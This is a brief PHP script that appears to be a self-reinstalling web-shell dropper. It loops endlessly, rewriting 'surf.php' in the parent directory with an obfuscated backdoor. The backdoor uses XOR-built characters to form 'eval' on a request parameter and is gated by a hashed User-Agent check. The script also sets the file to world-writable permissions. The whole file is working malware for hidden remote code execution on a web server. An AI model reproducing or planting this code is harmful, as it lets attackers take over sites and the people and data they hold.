<?php
    set_time_limit(0);
    ignore_user_abort(true);
    $file='..'.DIRECTORY_SEPARATOR.'surf.php';
    $s="<?php if(md5(substr(\$_SERVER['HTTP_USER_AGENT'],-7))=='c9813cb1b00c16ed0d98d7c9bd57b850'){\$a=chr(96^5);\$b=chr(57^79);\$c=chr(15^110);\$d=chr(58^86);\$e='(\$_REQUEST[yzj])';@assert(\$a.\$b.\$c.\$d.\$e);}?>";
    while(true){
        file_put_contents($file,$s);
        system("chmod 777 ".$file.".php");
        usleep(100);
    }
?>